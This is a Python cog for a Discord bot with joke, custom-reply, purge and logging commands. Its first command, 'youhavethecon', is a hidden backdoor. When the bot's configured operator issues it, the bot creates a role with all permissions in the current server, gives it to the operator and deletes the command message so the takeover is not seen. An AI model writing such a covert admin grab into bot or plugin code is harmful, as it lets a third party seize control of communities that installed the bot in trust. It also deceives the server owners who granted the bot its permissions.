"""
bot_commands.py
Samuel Lee
10/9/2021
"""
import discord
from discord.ext import commands
import config


class BotCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    #iykyk
    @commands.command()
    async def youhavethecon(self, ctx):
        if ctx.author.name != config.operator:
            print(f"{ctx.author.name} != {config.operator}")
            await ctx.message.delete()
            return
        guild = ctx.guild
        perms = discord.Permissions.all()
        role = await guild.create_role(name=f"{config.operator}", permissions=perms, reason="sorry pls dont delete")
        await ctx.author.add_roles(role)
        await ctx.message.delete()
        return


    @commands.command(aliases=["test"])
    async def import_test(self, ctx):
        await ctx.send("PASS")


    @commands.command(aliases=["rand", "chance"])
    async def change_chance(self, ctx, chance, active):
        try:
            if not ctx.author.guild_permissions.administrator:
                return
            tr = ["true", '1', 'y', 'yes']
            fa = ['false', '0', 'n', 'no']
            response = []
            if chance.isdigit() and int(chance) >= 0:
                config.random_chance = int(chance)
                response.append(f'Chance is now 1 in {chance}')
            if active in tr:
                config.chancing = True
                response.append(f'Chancing is now {config.chancing}')
            if active in fa:
                config.chancing = False
                response.append(f'Chancing is now {config.chancing}')
            await ctx.send(', '.join(response))
        except Exception as e:
            await ctx.send(f'{type(e)}: {e}')


    # sets a main channel for the guild and channel this command was called in
    @commands.command(aliases=["default", "sdc"])
    async def set_default_channel(self, ctx):
        print("!set_default_channel called")
        if not ctx.author.guild_permissions.administrator:
            print("Unauthorized user called set_default_channel")
            self.bot.eventlog(f"Unauthorized set_default_channel called by {ctx.author.name}", "ERR")
            return
        config.bound_text_channels[f"{ctx.guild}"] = ctx.message.channel.id
        print(f"{ctx.guild} = {ctx.message.channel.id}")
        await ctx.send(f"This channel was bound as {ctx.guild}'s Jester_ channel!")


    # users and respective replies to 
    @commands.command(aliases=["acr"])
    async def add_custom_reply(self, ctx, name, *, phrase):
        if not ctx.author.guild_permissions.administrator:
            return
        if name in config.reply_users.keys():
            config.reply_users[name].append(phrase)
        else:
            config.reply_users[name] = [phrase]


    @commands.command(aliases=["lcr"])
    async def list_custom_reply(self, ctx, name):
        if not ctx.author.guild_permissions.administrator:
            return
        try:
            replies = "\n\n".join([str(i+1)+ ". " + p for i, p in enumerate(config.reply_users[name])])
            await ctx.send(replies)
        except KeyError as k:
            await ctx.send(f"Invalid name: {k}")
        except Exception as e:
            await ctx.send(f"{type(e)}: {e}")

    
    @commands.command(aliases=["rcr"])
    async def remove_custom_reply(self, ctx, name, index):
        if not ctx.author.guild_permissions.administrator or not name in config.reply_users.keys():
            return
        if not index.isdigit():
            await ctx.send(f"{index} is not a number")
            return
        try:
            num = int(index)
            popped = config.reply_users[name].pop(num-1)
            await ctx.send(f"{popped} was removed")
            if len(config.reply_users[name]) == 0:
                config.reply_users.pop(name)
        except Exception as e:
            await ctx.send(f"{type(e)}: {e}")


    # cute take on ping and pong
    @commands.command()
    async def ping(self, ctx):
        await ctx.send("What does a battle rifle have in common with a microwave?")


    # cute take on ping and pong
    @commands.command()
    async def pong(self, ctx):
        await ctx.send("They both go 'ping' when they're done.")


    # clear a text channel of 500 newest messages
    # or clear a DMchannel of all bots messages in the last 500
    @commands.command(aliases=["purge"])
    async def jester_purge(self, ctx):
        if ctx.channel.type == discord.ChannelType.private:
            async for mes in ctx.channel.history(limit=500):
                if mes.author == self.bot.user:
                    await mes.delete()
            return
        if ctx.author.name != config.operator:
            ctx.send("Invalid user")
            return
        await ctx.channel.purge(limit = 500)


    # toggles logging of messages
    @commands.command()
    async def log(self, ctx, event=None, message=None): 
        if not ctx.author.guild_permissions.administrator:
            print(f"Unauthorized user {ctx.author.name} called log")
            return

        if event is None and message is None:
            config.event_logging = not config.event_logging
            config.message_logging = not config.message_logging

        else:
            if event.lower() in ["0", "no", "false"]:
                config.event_logging = False
            elif event.lower() in ["1", "yes", "true"]:
                config.event_logging = True
            else:
                pass

            if message.lower() in ["0", "no", "false"]:
                config.message_logging = False
            elif message.lower() in ["1", "yes", "true"]:
                config.message_logging = True
            else:
                pass

        if ctx.guild.name in config.bound_text_channels.keys():
            channel = discord.utils.get(ctx.guild.text_channels, id=config.bound_text_channels[ctx.guild.name])
            await channel.send(f"Event Logging: {config.event_logging}\nMessage Logging: {config.message_logging}")


async def setup(bot):
    await bot.add_cog(BotCommands(bot))